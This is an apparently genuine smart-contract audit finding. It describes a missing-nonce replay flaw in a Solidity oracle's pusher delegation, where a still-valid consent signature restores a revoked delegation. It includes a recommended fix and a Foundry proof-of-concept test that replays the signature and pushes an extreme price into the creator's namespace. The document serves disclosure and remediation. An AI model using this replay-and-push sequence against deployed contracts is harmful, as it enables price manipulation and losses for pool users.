### Title
Pusher consent signature in `allowPushers` lacks a nonce, allowing replay within the deadline window to silently re-establish revoked delegation and feed bad prices into pools — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but includes no nonce in the signed payload. A creator who holds a still-valid (pre-deadline) signature can call `allowPushers` again after the pusher has self-revoked via `revokePusher`, silently re-establishing the delegation without any fresh consent from the pusher. If the pusher's key was compromised — the very reason the pusher revoked — the attacker retains write authority over the creator's namespace and can push arbitrary prices that flow through `AnchoredPriceProvider.getBidAndAskPrice()` into live pool swaps.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The five fields bind the signature to one chain, one contract, one deadline, one pusher, and one creator. There is no nonce, no delegation-count, and no "already-used" bitmap. `_ensureDeadline` only checks `block.timestamp <= deadline`: [2](#0-1) 

So the same bytes can be submitted to `allowPushers` an unlimited number of times as long as the deadline has not expired.

The code comment on `allowPushers` explicitly acknowledges the deadline is the only replay guard:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

The comment treats the deadline as sufficient protection, but the deadline only prevents replay **after** it expires. Within the window `[now, deadline]` the signature is unconditionally reusable.

`revokePusher` clears `namespaceRemapping[msg.sender]` to `address(0)`: [4](#0-3) 

Nothing marks the original signature as consumed. A creator who still holds the bytes can immediately call `allowPushers` again with the identical arguments and restore `namespaceRemapping[pusher] = creator`.

---

### Impact Explanation

Once delegation is re-established, the `fallback` push path resolves the pusher's namespace to the creator:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

Any push from the compromised pusher key lands in the creator's namespace. The `AnchoredPriceProvider._readLeg` reads that namespace via `IPricedOracle.price(feedId, pool)`: [6](#0-5) 

A manipulated mid price passes through the staleness check, the `mid == 0` guard, the `spreadBps >= ORACLE_BPS` guard, and the `priceGuard` range check (if no guard is set, `guardMax` defaults to `type(uint128).max`): [7](#0-6) 

The corrupted mid then drives `_computeBidAsk`, producing a bad bid/ask pair that the pool consumes during a live swap — a direct bad-price execution impact.

---

### Likelihood Explanation

The trigger requires two conditions that can realistically co-occur:

1. **Pusher key compromise** — the pusher detects the compromise and calls `revokePusher()` as an emergency measure.
2. **Creator replays the old signature** — the creator, unaware of the compromise, wants to re-delegate the pusher (e.g., believing the revocation was accidental) and replays the original signature bytes, which are publicly visible on-chain from the first `allowPushers` call.

Deadlines in practice are set days to weeks in the future (the test suite uses `block.timestamp + 1 days`), leaving a wide replay window. The creator needs no special privilege beyond what they already hold; the replay call is indistinguishable from a legitimate re-delegation.

---

### Recommendation

Add a per-pusher-per-creator nonce to the signed payload and increment it on every successful `allowPushers` call. Alternatively, record a `delegationNonce[pusher][creator]` counter and include it in the digest:

```solidity
// In storage:
mapping(address => mapping(address => uint256)) public delegationNonce;

// In allowPushers:
uint256 nonce = delegationNonce[pusher][msg.sender]++;
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, nonce))
);
```

This ensures each consent signature is single-use: after the first `allowPushers` call the nonce advances, making the original bytes invalid for any future call regardless of the deadline.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEADBEEF;

    address creator;
    address pusher;

    function setUp() public {
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // 3. Pusher revokes (e.g., key compromise detected).
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no nonce, deadline still valid.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds!
        assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated without fresh consent");

        // 5. Attacker (holding compromised pusher key) pushes a bad price into creator's namespace.
        uint56 tsMs   = uint56(block.timestamp * 1000);
        uint48 badRaw = (uint48(uint32(0xFFFFFF)) << 16) | (uint48(5) << 8) | uint48(5); // extreme price
        uint256 word  = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        word |= uint256(badRaw) << 208;                    // position 0

        vm.prank(pusher); // attacker controls this key
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "bad push accepted");

        // 6. Bad price is now live in creator's namespace, readable by AnchoredPriceProvider.
        IOffchainOracle.OracleData memory data =
            oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
        assertGt(data.price, 0, "bad price stored in creator namespace");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-192)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-207)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L280-283)
```text
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L287-294)
```text
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
```
